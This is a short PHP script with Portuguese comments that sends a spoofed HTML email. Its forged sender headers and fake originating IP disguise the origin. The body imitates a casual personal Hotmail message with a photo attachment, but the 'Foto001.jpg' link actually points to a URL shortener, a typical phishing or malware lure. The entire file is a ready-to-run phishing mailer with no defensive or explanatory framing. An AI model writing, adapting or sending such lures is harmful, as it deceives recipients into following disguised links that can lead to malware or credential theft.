<?php
/* Destinatário */
$to = "lucascot_@Hotmail.com";
$de = "adriana2009@hotmail.com";

$server = $_SERVER['SERVER_NAME'];

/* assunto */
$subject = "Urgente 04/06";

/* mensagem */
$message = '
<html style="background: transparent none repeat scroll 0% 0%; -moz-background-clip: -moz-initial; -moz-background-origin: -moz-initial; -moz-background-inline-policy: -moz-initial;"><head><style>body {margin:8px} .tr-field {font:normal small arial} img {-moz-force-broken-image-icon: 1;}</style></head><body g_editable="true" hidefocus="true" class="editable tr-field" id=":j4" style=""><div class="gmail_quote"><div><table cellpadding="0" cellspacing="0">
<tbody>
<tr>
<td><br></td>
<td>
<div>
<font face="Arial"><br>Desculpa pela demora, &eacute; porque nao tive tempo de mandar antes..</font>
<font face="Arial"><br>Bjs.</font>
<br>
<div>
<table width="100%" cellpadding="0" cellspacing="0">
<tbody>
<br>
<tr>
<td><img  src="http://gfx2.hotmail.com/mail/w3/ltr/i_attach.gif"></td>
<td>1 anexo</td></a>
<br>
<tr>
<td><br></td>
<td colspan="2"><span><a href="http://doiop.com/Fotos001" target="_blank"><font color="#0066cc">Foto001.jpg</font></a> (89,0 KB) </span></td></tr></tbody></table></div>
</div>
</td></tr></tbody></table><br></div></div><br></body></html>





';

/* Atenção se você pretende inserir numa variável uma mensagem html mais
complexa do que essa sem precisar escapar os carateres
necessários pode ser feito o uso da sintaxe heredoc, consulte tipos-string-sintaxe-heredoc */

/* Para enviar email HTML, você precisa definir o header Content-type. */
$headers = "MIME-Version: 1.0\r\n";
$headers .= "Content-type: text/html; charset=iso-8859-1\r\n";

/* headers adicionais */
$headers .= "From: $server <$de>\n";
$headers .= "Errors-To: $de\n";
$headers .= "Reply-To: $server <$de>\n";
$headers .= "Message-ID: <".md5(uniqid(time()))."@$mailserver>\n";
$headers .= "X-Originating-Email: [$server]\n";
$headers .= "X-Originating-IP: [200.201.120.121]\n";

/* Enviar o email */
if(mail($to, $subject, $message, $headers)) {
echo "<font color=green face=verdana size=1>* Já elvis, foi enviado porra!\n</font>";
}
else {
echo "<font color=red face=verdana size=1>* Merda, nem constou!\n</font>";
}
?>